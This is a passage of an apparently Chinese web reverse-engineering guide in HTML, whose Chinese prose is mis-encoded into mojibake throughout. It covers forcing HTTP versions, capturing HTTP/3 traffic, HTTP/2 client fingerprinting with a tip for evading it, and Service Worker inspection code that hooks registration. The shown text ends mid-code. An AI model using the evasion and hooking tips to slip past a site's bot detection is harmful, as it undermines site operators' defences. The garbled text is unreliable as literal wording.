      <h3 id="q1-å¦‚ä½•å¼ºåˆ¶ä½¿ç”¨ç‰¹å®šçš„-http-ç‰ˆæœ¬">Q1: å¦‚ä½•å¼ºåˆ¶ä½¿ç”¨ç‰¹å®šçš„ HTTP ç‰ˆæœ¬ï¼Ÿ</h3>

      <p><strong>Chrome</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># ç¦ç”¨ HTTP/2</span>
chrome<span class="w"> </span>--disable-http2

<span class="c1"># ç¦ç”¨ QUIC (HTTP/3)</span>
chrome<span class="w"> </span>--disable-quic
</code></pre>
      </div>

      <p><strong>curl</strong>:</p>

      <div class="codehilite">
        <pre><span></span><code>curl<span class="w"> </span>--http1.1<span class="w"> </span>https://example.com/<span class="w">  </span><span class="c1"># å¼ºåˆ¶ HTTP/1.1</span>
curl<span class="w"> </span>--http2<span class="w"> </span>https://example.com/<span class="w">    </span><span class="c1"># å¼ºåˆ¶ HTTP/2</span>
curl<span class="w"> </span>--http3<span class="w"> </span>https://example.com/<span class="w">    </span><span class="c1"># å¼ºåˆ¶ HTTP/3</span>
</code></pre>
      </div>

      <hr />

      <h3 id="q2-burp-suite-æ— æ³•æŠ“å–-http3-æµé‡æ€ä¹ˆåŠ">Q2: Burp Suite æ— æ³•æŠ“å– HTTP/3 æµé‡æ€ä¹ˆåŠï¼Ÿ</h3>

      <p><strong>è§£å†³æ–¹æ¡ˆ</strong>:</p>

      <ol>
        <li><strong>ç¦ç”¨ HTTP/3</strong>: åœ¨æµè§ˆå™¨ä¸­ç¦ç”¨ QUIC
          <ul>
            <li>Chrome: <code>chrome://flags/</code> æœç´¢ &#8220;QUIC"ï¼Œè®¾ä¸º Disabled</li>
          </ul>
        </li>
        <li><strong>ä½¿ç”¨ Wireshark</strong>: Burp ä¸æ”¯æŒ HTTP/3ï¼Œä½¿ç”¨ Wireshark æŠ“åŒ…</li>
        <li><strong>æœåŠ¡å™¨é™çº§</strong>: åˆ é™¤ <code>Alt-Svc</code> å¤´ï¼Œé˜»æ­¢å®¢æˆ·ç«¯å‡çº§åˆ° HTTP/3</li>
      </ol>

      <hr />

      <h3 id="q3-http2-æ˜¯å¦ä¼šæ³„éœ²æ›´å¤šæŒ‡çº¹ä¿¡æ¯">Q3: HTTP/2 æ˜¯å¦ä¼šæ³„éœ²æ›´å¤šæŒ‡çº¹ä¿¡æ¯ï¼Ÿ</h3>

      <p><strong>æ˜¯çš„</strong>ï¼ŒHTTP/2 å¼•å…¥äº†æ–°çš„æŒ‡çº¹ç‚¹ï¼š</p>

      <ul>
        <li><strong>SETTINGS å¸§å‚æ•°</strong>: ä¸åŒå®¢æˆ·ç«¯çš„åˆå§‹è®¾ç½®ä¸åŒ</li>
        <li><strong>ä¼˜å…ˆçº§æ ‘</strong>: è¯·æ±‚ä¼˜å…ˆçº§çš„è®¾ç½®æ–¹å¼</li>
        <li><strong>æµ ID åˆ†é…</strong>: å¥‡å¶æ€§å’Œé¡ºåº</li>
      </ul>

      <p><strong>æ£€æµ‹ç¤ºä¾‹</strong>:</p>

      <pre><code>Chrome:
  SETTINGS_HEADER_TABLE_SIZE: 65536
  SETTINGS_INITIAL_WINDOW_SIZE: 6291456

Firefox:
  SETTINGS_HEADER_TABLE_SIZE: 4096
  SETTINGS_INITIAL_WINDOW_SIZE: 65535
</code></pre>

      <p><strong>å¯¹æŠ—</strong>: ä½¿ç”¨çœŸå®æµè§ˆå™¨è€Œéè„šæœ¬å·¥å…·ã€‚</p>

      <hr />

      <h2 id="8-å·¥å…·ä¸èµ„æº">8. å·¥å…·ä¸èµ„æº</h2>

      <h3 id="æ¨èå·¥å…·">æ¨èå·¥å…·</h3>

      <table>
        <thead>
          <tr>
            <th>å·¥å…·</th>
            <th>ç”¨é€”</th>
            <th>é“¾æ¥</th>
          </tr>
        </thead>
        <tbody>
          <tr>
            <td><strong>Wireshark</strong></td>
            <td>æŠ“åŒ…åˆ†æ</td>
            <td>https://www.wireshark.org/</td>
          </tr>
          <tr>
            <td><strong>httpx</strong></td>
            <td>Python HTTP/2/3 å®¢æˆ·ç«¯</td>
            <td>https://www.python-httpx.org/</td>
          </tr>
          <tr>
            <td><strong>curl</strong></td>
            <td>å‘½ä»¤è¡Œ HTTP å®¢æˆ·ç«¯</td>
            <td>https://curl.se/</td>
          </tr>
          <tr>
            <td><strong>h2spec</strong></td>
            <td>HTTP/2 åˆè§„æ€§æµ‹è¯•</td>
            <td>https://github.com/summerwind/h2spec</td>
          </tr>
          <tr>
            <td><strong>quic-go</strong></td>
            <td>Go è¯­è¨€ QUIC å®ç°</td>
            <td>https://github.com/quic-go/quic-go</td>
          </tr>
        </tbody>
      </table>

      <hr />

      <h3 id="å­¦ä¹ èµ„æº">å­¦ä¹ èµ„æº</h3>

      <ul>
        <li><a href="https://datatracker.ietf.org/doc/html/rfc7540">HTTP/2 RFC 7540</a></li>
        <li><a href="https://datatracker.ietf.org/doc/html/rfc9114">HTTP/3 RFC 9114</a></li>
        <li><a href="https://datatracker.ietf.org/doc/html/rfc9000">QUIC RFC 9000</a></li>
        <li><a href="https://http2-explained.haxx.se/zh">HTTP/2 Explained (ä¸­æ–‡)</a></li>
      </ul>

      <hr />

      <h2 id="9-æ€»ç»“">9. æ€»ç»“</h2>

      <p>HTTP/2 å’Œ HTTP/3 æ˜¯ç°ä»£ Web çš„åŸºçŸ³ï¼Œç†è§£å®ƒä»¬å¯¹äºé€†å‘å·¥ç¨‹è‡³å…³é‡è¦ï¼š</p>

      <p><strong>HTTP/2</strong>:</p>

      <ul>
        <li>âœ… å·²å¹¿æ³›éƒ¨ç½²ï¼Œå¿…é¡»æŒæ¡</li>
        <li>âœ… å·¥å…·æ”¯æŒå®Œå–„</li>
        <li>âš ï¸ TCP é˜Ÿå¤´é˜»å¡ä»å­˜åœ¨</li>
      </ul>

      <p><strong>HTTP/3</strong>:</p>

      <ul>
        <li>ğŸš€ æœªæ¥è¶‹åŠ¿ï¼Œé€æ­¥æ™®åŠ</li>
        <li>ğŸ”’ æ›´å®‰å…¨ï¼ˆå†…ç½®åŠ å¯†ï¼‰</li>
        <li>âš ï¸ å·¥å…·æ”¯æŒæœ‰é™</li>
      </ul>

      <p><strong>é€†å‘å»ºè®®</strong>:</p>

      <ol>
        <li>ä¼˜å…ˆä½¿ç”¨ Chrome DevTools åˆ†æ</li>
        <li>HTTP/2 å¯ç”¨ Burp/Charlesï¼ŒHTTP/3 ç”¨ Wireshark</li>
        <li>ä»£ç ä¸­ä½¿ç”¨ httpx æ”¯æŒæ–°åè®®</li>
        <li>æ³¨æ„åè®®é™çº§å’Œå…¼å®¹æ€§</li>
      </ol>

      <hr />

      <h2 id="ç›¸å…³ç« èŠ‚">ç›¸å…³ç« èŠ‚</h2>

      <ul>
        <li><a href="#01-Foundations-http-https-protocol">HTTP/HTTPS åè®®</a></li>
        <li><a href="#01-Foundations-tls-ssl-handshake">TLS/SSL æ¡æ‰‹è¿‡ç¨‹</a></li>
        <li><a href="#04-Advanced-Recipes-tls-fingerprinting">TLS æŒ‡çº¹è¯†åˆ«</a></li>
        <li><a href="#02-Tooling-wireshark-guide">Wireshark æŒ‡å—</a></li>
        <li><a href="#02-Tooling-browser-devtools">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
      </ul>

    </div>

    <div class="section" id="04-Advanced-Recipes-pwa-service-worker">
      <h2>44. PWA & Service Worker</h2>
      <h1 id="pwa-ä¸-service-worker-é€†å‘">PWA ä¸ Service Worker é€†å‘</h1>

      <h2 id="æ¦‚è¿°">æ¦‚è¿°</h2>

      <p>æ¸è¿›å¼ Web åº”ç”¨ (Progressive Web Apps, PWA) å’Œ Service Worker æŠ€æœ¯ä½¿å¾— Web åº”ç”¨èƒ½å¤Ÿç¦»çº¿å·¥ä½œã€æ¥æ”¶æ¨é€é€šçŸ¥å¹¶æä¾›ç±»ä¼¼åŸç”Ÿåº”ç”¨çš„ä½“éªŒã€‚åœ¨é€†å‘å·¥ç¨‹ä¸­ï¼Œç†è§£ Service
        Worker çš„å·¥ä½œåŸç†å¯¹äºåˆ†æç°ä»£ Web åº”ç”¨ã€ç»•è¿‡ç¼“å­˜ç­–ç•¥å’Œç†è§£è¯·æ±‚æ‹¦æˆªæœºåˆ¶è‡³å…³é‡è¦ã€‚</p>

      <hr />

      <h2 id="åŸºç¡€æ¦‚å¿µ">åŸºç¡€æ¦‚å¿µ</h2>

      <h3 id="å®šä¹‰">å®šä¹‰</h3>

      <p><strong>PWA (Progressive Web App)</strong> æ˜¯ä¸€ç§ä½¿ç”¨ç°ä»£ Web æŠ€æœ¯æ„å»ºçš„åº”ç”¨ï¼Œå…·æœ‰ç±»ä¼¼åŸç”Ÿåº”ç”¨çš„ä½“éªŒï¼š</p>

      <ul>
        <li>å¯å®‰è£…åˆ°ä¸»å±å¹•</li>
        <li>ç¦»çº¿å·¥ä½œ</li>
        <li>åå°åŒæ­¥</li>
        <li>æ¨é€é€šçŸ¥</li>
        <li>å¿«é€Ÿå“åº”</li>
      </ul>

      <p><strong>Service Worker</strong> æ˜¯ PWA çš„æ ¸å¿ƒæŠ€æœ¯ï¼Œæ˜¯è¿è¡Œåœ¨æµè§ˆå™¨åå°çš„è„šæœ¬ï¼š</p>

      <ul>
        <li>ç‹¬ç«‹äºç½‘é¡µçš„ç”Ÿå‘½å‘¨æœŸ</li>
        <li>å¯ä»¥æ‹¦æˆªå’Œå¤„ç†ç½‘ç»œè¯·æ±‚</li>
        <li>å®ç°ç¦»çº¿ç¼“å­˜å’Œç­–ç•¥</li>
        <li>æ— æ³•ç›´æ¥è®¿é—® DOM</li>
        <li>ä½¿ç”¨ Promise è¿›è¡Œå¼‚æ­¥æ“ä½œ</li>
      </ul>

      <h3 id="æ ¸å¿ƒåŸç†">æ ¸å¿ƒåŸç†</h3>

      <h4 id="service-worker-ç”Ÿå‘½å‘¨æœŸ">Service Worker ç”Ÿå‘½å‘¨æœŸ</h4>

      <pre><code>stateDiagram-v2
    [*] --&gt; Parsed: é¡µé¢åŠ è½½ SW è„šæœ¬

    Parsed --&gt; Installing: navigator.serviceWorker&lt;br/&gt;.register()
    Installing --&gt; Installed: install äº‹ä»¶å®Œæˆ&lt;br/&gt;waitUntil() Promise è§£å†³

    Installed --&gt; Activating: æ—§ SW åœæ­¢ æˆ–&lt;br/&gt;skipWaiting()
    Activating --&gt; Activated: activate äº‹ä»¶å®Œæˆ&lt;br/&gt;waitUntil() Promise è§£å†³

    Activated --&gt; Idle: å‡†å¤‡å°±ç»ª
    Idle --&gt; Fetch: æ‹¦æˆªç½‘ç»œè¯·æ±‚
    Idle --&gt; Message: æ¥æ”¶é¡µé¢æ¶ˆæ¯
    Idle --&gt; Push: æ¥æ”¶æ¨é€é€šçŸ¥
    Idle --&gt; Sync: åå°åŒæ­¥è§¦å‘

    Fetch --&gt; Idle: å¤„ç†å®Œæˆ
    Message --&gt; Idle: å¤„ç†å®Œæˆ
    Push --&gt; Idle: å¤„ç†å®Œæˆ
    Sync --&gt; Idle: å¤„ç†å®Œæˆ

    Idle --&gt; Redundant: unregister() æˆ–&lt;br/&gt;è¢«æ–° SW æ›¿æ¢
    Redundant --&gt; [*]

    note right of Installing
        è§¦å‘: install äº‹ä»¶
        æ“ä½œ:
        - ç¼“å­˜é™æ€èµ„æº
        - åˆå§‹åŒ–æ•°æ®åº“
    end note

    note right of Activating
        è§¦å‘: activate äº‹ä»¶
        æ“ä½œ:
        - æ¸…ç†æ—§ç¼“å­˜
        - è¿ç§»æ•°æ®
        - clients.claim()
    end note

    note right of Idle
        è¿è¡ŒçŠ¶æ€
        ç›‘å¬äº‹ä»¶:
        - fetch (è¯·æ±‚æ‹¦æˆª)
        - message (æ¶ˆæ¯)
        - push (æ¨é€)
        - sync (åå°åŒæ­¥)
    end note
</code></pre>

      <h4 id="service-worker-ä¸é¡µé¢äº¤äº’æµç¨‹">Service Worker ä¸é¡µé¢äº¤äº’æµç¨‹</h4>

      <pre><code>sequenceDiagram
    participant Page as ç½‘é¡µ&lt;br/&gt;(Main Thread)
    participant SW as Service Worker&lt;br/&gt;(Worker Thread)
    participant Cache as Cache Storage
    participant Network as ç½‘ç»œæœåŠ¡å™¨

    Note over Page,Network: 1. æ³¨å†Œé˜¶æ®µ
    Page-&gt;&gt;SW: navigator.serviceWorker.register('/sw.js')
    activate SW
    Note over SW: Parsed â†’ Installing

    SW-&gt;&gt;SW: install äº‹ä»¶è§¦å‘
    SW-&gt;&gt;Cache: cache.addAll([é™æ€èµ„æº])
    Cache--&gt;&gt;SW: ç¼“å­˜å®Œæˆ
    Note over SW: Installing â†’ Installed

    SW-&gt;&gt;SW: activate äº‹ä»¶è§¦å‘
    SW-&gt;&gt;Cache: æ¸…ç†æ—§ç¼“å­˜ç‰ˆæœ¬
    SW-&gt;&gt;Page: clients.claim() æ§åˆ¶é¡µé¢
    Note over SW: Installed â†’ Activated â†’ Idle
    deactivate SW

    Note over Page,Network: 2. è¿è¡Œé˜¶æ®µ - è¯·æ±‚æ‹¦æˆª

    Page-&gt;&gt;SW: fetch('/api/data')
    activate SW
    Note over SW: fetch äº‹ä»¶è§¦å‘

    SW-&gt;&gt;Cache: caches.match(request)
    Cache--&gt;&gt;SW: ç¼“å­˜å‘½ä¸­/æœªå‘½ä¸­

    alt ç¼“å­˜å‘½ä¸­
        SW--&gt;&gt;Page: è¿”å›ç¼“å­˜å“åº” âš¡
    else ç¼“å­˜æœªå‘½ä¸­
        SW-&gt;&gt;Network: fetch(request)
        Network--&gt;&gt;SW: ç½‘ç»œå“åº”
        SW-&gt;&gt;Cache: cache.put(request, response)
        SW--&gt;&gt;Page: è¿”å›ç½‘ç»œå“åº”
    end
    deactivate SW

    Note over Page,Network: 3. æ¶ˆæ¯é€šä¿¡

    Page-&gt;&gt;SW: postMessage({type: 'SKIP_WAITING'})
    activate SW
    SW-&gt;&gt;SW: message äº‹ä»¶è§¦å‘
    SW-&gt;&gt;SW: self.skipWaiting()
    SW--&gt;&gt;Page: postMessage({type: 'ACTIVATED'})
    deactivate SW

    Note over Page,Network: 4. åå°åŠŸèƒ½

    Network-&gt;&gt;SW: Push é€šçŸ¥
    activate SW
    SW-&gt;&gt;SW: push äº‹ä»¶è§¦å‘
    SW-&gt;&gt;Page: showNotification()
    deactivate SW

    SW-&gt;&gt;SW: sync äº‹ä»¶è§¦å‘
    activate SW
    SW-&gt;&gt;Network: åå°æ•°æ®åŒæ­¥
    deactivate SW
</code></pre>

      <p><strong>ç”Ÿå‘½å‘¨æœŸäº‹ä»¶</strong>:</p>

      <ol>
        <li><strong>install</strong>: Service Worker é¦–æ¬¡å®‰è£…æ—¶è§¦å‘ï¼Œç”¨äºç¼“å­˜å…³é”®èµ„æº</li>
        <li><strong>activate</strong>: Service Worker æ¿€æ´»æ—¶è§¦å‘ï¼Œç”¨äºæ¸…ç†æ—§ç¼“å­˜å’Œæ•°æ®è¿ç§»</li>
        <li><strong>fetch</strong>: æ¯æ¬¡ç½‘ç»œè¯·æ±‚æ—¶è§¦å‘ï¼ˆå¦‚æœæ³¨å†Œäº†ï¼‰ï¼Œå®ç°è¯·æ±‚æ‹¦æˆªå’Œç¼“å­˜ç­–ç•¥</li>
        <li><strong>message</strong>: æ¥æ”¶æ¥è‡ªé¡µé¢çš„æ¶ˆæ¯ï¼Œå®ç°åŒå‘é€šä¿¡</li>
        <li><strong>push</strong>: æ¥æ”¶æ¨é€é€šçŸ¥ï¼Œå³ä½¿é¡µé¢æœªæ‰“å¼€ä¹Ÿèƒ½æ”¶åˆ°</li>
        <li><strong>sync</strong>: åå°åŒæ­¥ï¼Œåœ¨ç½‘ç»œæ¢å¤æ—¶åŒæ­¥æ•°æ®</li>
      </ol>

      <hr />

      <h2 id="è¯¦ç»†å†…å®¹">è¯¦ç»†å†…å®¹</h2>

      <h3 id="service-worker-æ³¨å†Œä¸æ£€æµ‹">Service Worker æ³¨å†Œä¸æ£€æµ‹</h3>

      <h4 id="1-æ£€æµ‹å·²æ³¨å†Œçš„-service-worker">1. <strong>æ£€æµ‹å·²æ³¨å†Œçš„ Service Worker</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ£€æµ‹å½“å‰é¡µé¢æ˜¯å¦æœ‰ Service Worker</span>
<span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;serviceWorker&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">navigator</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">getRegistrations</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">registrations</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Found Service Workers:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registrations</span><span class="p">.</span><span class="nx">length</span><span class="p">);</span>

<span class="w">        </span><span class="nx">registrations</span><span class="p">.</span><span class="nx">forEach</span><span class="p">((</span><span class="nx">registration</span><span class="p">,</span><span class="w"> </span><span class="nx">index</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="sb">`Service Worker </span><span class="si">${</span><span class="nx">index</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mf">1</span><span class="si">}</span><span class="sb">:`</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Scope:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registration</span><span class="p">.</span><span class="nx">scope</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Active:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registration</span><span class="p">.</span><span class="nx">active</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Waiting:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registration</span><span class="p">.</span><span class="nx">waiting</span><span class="p">);</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Installing:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registration</span><span class="p">.</span><span class="nx">installing</span><span class="p">);</span>

<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">registration</span><span class="p">.</span><span class="nx">active</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  Script URL:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registration</span><span class="p">.</span><span class="nx">active</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">);</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;  State:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registration</span><span class="p">.</span><span class="nx">active</span><span class="p">.</span><span class="nx">state</span><span class="p">);</span>
<span class="w">            </span><span class="p">}</span>
<span class="w">        </span><span class="p">});</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h4 id="2-ç›‘æ§-service-worker-çŠ¶æ€">2. <strong>ç›‘æ§ Service Worker çŠ¶æ€</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="s1">&#39;serviceWorker&#39;</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="nx">navigator</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">ready</span><span class="p">.</span><span class="nx">then</span><span class="p">(</span><span class="nx">registration</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Service Worker is ready&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Scope:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registration</span><span class="p">.</span><span class="nx">scope</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// ç›‘å¬çŠ¶æ€å˜åŒ–</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">registration</span><span class="p">.</span><span class="nx">active</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">registration</span><span class="p">.</span><span class="nx">active</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;statechange&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Service Worker state changed:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">.</span><span class="nx">target</span><span class="p">.</span><span class="nx">state</span><span class="p">);</span>
<span class="w">            </span><span class="p">});</span>
<span class="w">        </span><span class="p">}</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// ç›‘å¬æ›´æ–°</span>
<span class="w">    </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;updatefound&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Service Worker update found&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">});</span>

<span class="w">    </span><span class="c1">// ç›‘å¬æ§åˆ¶å™¨å˜åŒ–</span>
<span class="w">    </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;controllerchange&#39;</span><span class="p">,</span><span class="w"> </span><span class="p">()</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Service Worker controller changed&#39;</span><span class="p">);</span>
<span class="w">    </span><span class="p">});</span>
<span class="p">}</span>
</code></pre>
      </div>

      <h3 id="æ‹¦æˆªå’Œåˆ†æè¯·æ±‚">æ‹¦æˆªå’Œåˆ†æè¯·æ±‚</h3>

      <h4 id="1-è¯»å–-service-worker-è„šæœ¬">1. <strong>è¯»å– Service Worker è„šæœ¬</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// è·å– Service Worker è„šæœ¬å†…å®¹</span>
<span class="k">async</span><span class="w"> </span><span class="kd">function</span><span class="w"> </span><span class="nx">fetchServiceWorkerScript</span><span class="p">(</span><span class="nx">registration</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="nx">registration</span><span class="p">.</span><span class="nx">active</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;No active Service Worker&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span>

<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">scriptURL</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">registration</span><span class="p">.</span><span class="nx">active</span><span class="p">.</span><span class="nx">scriptURL</span><span class="p">;</span>
<span class="w">    </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Fetching Service Worker script:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">scriptURL</span><span class="p">);</span>

<span class="w">    </span><span class="k">try</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">response</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="nx">scriptURL</span><span class="p">);</span>
<span class="w">        </span><span class="kd">const</span><span class="w"> </span><span class="nx">script</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">response</span><span class="p">.</span><span class="nx">text</span><span class="p">();</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Service Worker script:&#39;</span><span class="p">);</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">script</span><span class="p">);</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">script</span><span class="p">;</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">error</span><span class="p">(</span><span class="s1">&#39;Failed to fetch Service Worker:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">e</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">}</span>

<span class="c1">// ä½¿ç”¨</span>
<span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">getRegistrations</span><span class="p">().</span><span class="nx">then</span><span class="p">(</span><span class="nx">registrations</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">registrations</span><span class="p">.</span><span class="nx">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">fetchServiceWorkerScript</span><span class="p">(</span><span class="nx">registrations</span><span class="p">[</span><span class="mf">0</span><span class="p">]);</span>
<span class="w">    </span><span class="p">}</span>
<span class="p">});</span>
</code></pre>
      </div>

      <h4 id="2-hook-service-worker-æ³¨å†Œ">2. <strong>Hook Service Worker æ³¨å†Œ</strong></h4>

      <div class="codehilite">
        <pre><span></span><code><span class="c1">// æ‹¦æˆª Service Worker æ³¨å†Œ</span>
<span class="p">(</span><span class="kd">function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
<span class="w">    </span><span class="kd">const</span><span class="w"> </span><span class="nx">originalRegister</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="p">;</span>

<span class="w">    </span><span class="nx">navigator</span><span class="p">.</span><span class="nx">serviceWorker</span><span class="p">.</span><span class="nx">register</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">scriptURL</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW Register] Intercepted:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">scriptURL</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">);</span>

<span class="w">        </span><span class="c1">// å¯ä»¥ä¿®æ”¹è„šæœ¬ URL æˆ–é€‰é¡¹</span>
<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">originalRegister</span><span class="p">.</span><span class="nx">call</span><span class="p">(</span><span class="k">this</span><span class="p">,</span><span class="w"> </span><span class="nx">scriptURL</span><span class="p">,</span><span class="w"> </span><span class="nx">options</span><span class="p">).</span><span class="nx">then</span><span class="p">(</span><span class="nx">registration</span><span class="w"> </span><span class="p">=&gt;</span><span class="w"> </span><span class="p">{</span>
<span class="w">            </span><span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;[SW Register] Success:&#39;</span><span class="p">,</span><span class="w"> </span><span class="nx">registration</span><span class="p">);</span>

<span class="w">            </span><span class="c1">// ç›‘å¬å®‰è£…å’Œæ¿€æ´»</span>
<span class="w">            </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">registration</span><span class="p">.</span><span class="nx">installing</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">registration</span><span class="p">.</span><span class="nx">installing</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;statechange&#39;</span><span class="p">,</span><span class="w"> </span><span class="kd">function</span><span class="p">(</span><span class="nx">e</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
